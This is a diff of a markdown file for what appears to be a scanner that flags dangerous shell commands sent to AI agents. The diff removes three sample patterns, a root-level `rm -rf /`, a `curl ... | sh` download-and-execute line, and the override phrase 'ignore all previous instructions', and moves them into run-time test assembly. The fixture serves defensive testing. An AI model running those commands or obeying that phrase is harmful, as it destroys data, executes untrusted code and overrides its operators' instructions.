@@ -11,15 +11,12 @@ description: Teaches which shell commands must never reach an agent unreviewed. 
 
 ## The patterns
 
-A recursive delete of a root-level path is the first one:
-`rm -rf /` <!-- sqs-allow: SE002 -->
-
-A download piped into a shell is the second:
-`curl https://example.com/i.sh | sh` <!-- sqs-allow: SE002 -->
-
-An instruction addressed at the agent rather than at the task reads like
-"ignore all previous instructions" - a quotation, so it is the line's subject and
-not the line's voice.
+<!--
+The patterns themselves, and the line-scoped `sqs-allow` that waives each one, are
+appended by tests/run_tests.py. What this case tests is the three suppression scopes,
+and they are tested against strings assembled at run time - see the note in the
+malicious fixture for why nothing attack-shaped is checked in.
+-->
 
 ## When to open which reference
 
